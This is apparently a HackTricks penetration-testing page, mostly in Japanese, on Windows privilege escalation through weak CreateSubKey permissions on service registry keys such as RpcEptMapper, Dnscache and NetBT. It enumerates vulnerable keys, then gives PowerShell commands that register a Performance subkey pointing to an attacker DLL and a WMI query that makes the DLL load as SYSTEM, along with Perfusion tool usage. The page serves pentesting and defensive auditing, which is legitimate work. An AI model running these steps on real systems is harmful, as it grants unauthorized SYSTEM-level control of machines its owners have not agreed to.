# サービス Registry に対する AppendData/AddSubdirectory Permission

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Summary

サービスの Registry key に **`Create Subkey`** / **`AppendData/AddSubdirectory`** しかない場合でも、これは privesc の有力な手がかりになります。通常、`ImagePath`、`ServiceDll`、その他の既存の値を直接上書きすることは**できません**が、以下の場所に **`Performance`** child key を作成できる可能性があります。

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- token に **`KEY_CREATE_SUB_KEY`** がある、その他の **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key

その仕組みは、Windows が従来の **PerfLib V1** registration model を引き続きサポートしていることです。サービスに **`Performance`** subkey がある場合、performance counter consumer がデータを要求した際に、Windows はそこから DLL を load できます。

Microsoft の documentation によると、最低限必要な registration は次のとおりです。<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
つまり、攻撃側からの要点は次のとおりです。**`SetValue` ではなく `CreateSubKey` しか取得できなかったという理由だけで、service registry の finding を破棄してはいけません**。<sup>[[3]](#references)</sup>

## これで code execution に十分な理由

通常、これらの service には **`Performance`** subkey はデフォルトで存在しないため、必要な primitive は **`KEY_CREATE_SUB_KEY`** です。キーが存在し、`Library`/`Open`/`Collect`/`Close` を含んでいれば、任意の **performance counter consumer** が DLL の load を trigger できます。<sup>[[3]](#references)</sup>

重要な点を以下に示します。

- **`Library`** value には **full DLL path** を指定できます。
- DLL は **`OpenPerfData`**、**`CollectPerfData`**、**`ClosePerfData`** を export し、`ERROR_SUCCESS` を返す必要があります。
- code は **vulnerable service process 自体ではなく**、**consumer の context** で実行されます。
- 従来の `RpcEptMapper` / `Dnscache` のケースでは、**WMI performance query** によって **`wmiprvse.exe`** が DLL を **`NT AUTHORITY\SYSTEM`** として load できます。

このため、triage 中にこの primitive は見落とされやすくなります。parent service key は「完全に writable」ではありませんが、それでも weaponize できます。

## Quick enumeration

**AccessChk** を使った手動の spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
サービスキーに対して **`CreateSubKey`** を持つ低権限プリンシパルを探す PowerShell の例:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
有用な tool:

- **PrivescCheck**: `Get-ModifiableRegistryPath` は、この種類の問題を特定するために作成されています。<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: DLL の drop、`Performance` の登録、WMI trigger、token duplication、cleanup を、従来の脆弱な target 上で自動化します（例: `Perfusion.exe -c cmd -i -k Dnscache`）。<sup>[[4]](#references)</sup>

## 悪用の流れ

`Performance` subkey を作成し、必要な values を設定します。<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
次に、**privileged** なパフォーマンス consumer をトリガーします。典型的な例として、`Win32_Perf*` classes に対する WMI query があります。<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
運用上の注意:

- **`perfmon.exe`** の起動は、counter registration が正しいことの確認に役立ちますが、通常は **自身のユーザーコンテキスト** で DLL を読み込むだけです。
- 実際の LPE では、**WMI** などの **特権 consumer** を trigger します。
- 独自の exploit を作成する場合、DLL 内から直接 `cmd.exe` を spawn すると、通常は **session 0** の shell になります。`Perfusion` は、特権 token を attacker の session で suspended 状態に作成した process に duplicate することで、この問題を解決します。<sup>[[4]](#references)</sup>
- DLL の architecture を target consumer に合わせます（**x64 systems では x64**）。

## Version notes / recent developments

Historically、組み込みの weak keys は次のとおりでした:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` と `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` によると、**April 2021** の updates により、更新済みの **Windows 8 / Windows Server 2012** では容易な exploitation path が削除されました。一方、**Windows 7 / Windows Server 2008 R2** では、**`Dnscache`** を通じて引き続き exploitable でした。<sup>[[4]](#references)</sup>

この primitive は **historical なものだけではありません**。**January 2025**、Microsoft は、**`Network Configuration Operators`** の members が **`Dnscache`** および **`NetBT`** の下に subkeys を作成できる、関連する AD DS issue に patch を適用しました。また、同じ **Performance-counter DLL registration** の考え方を再利用して、supported systems 上で **SYSTEM** に到達できました。<sup>[[2]](#references)</sup>

したがって、modern な lesson は generic です: low-privileged principal が **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** に対する **`CreateSubKey`** を持っている場合、finding を dismiss する前に **`Performance`** child key だけで十分かどうかを確認してください。

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
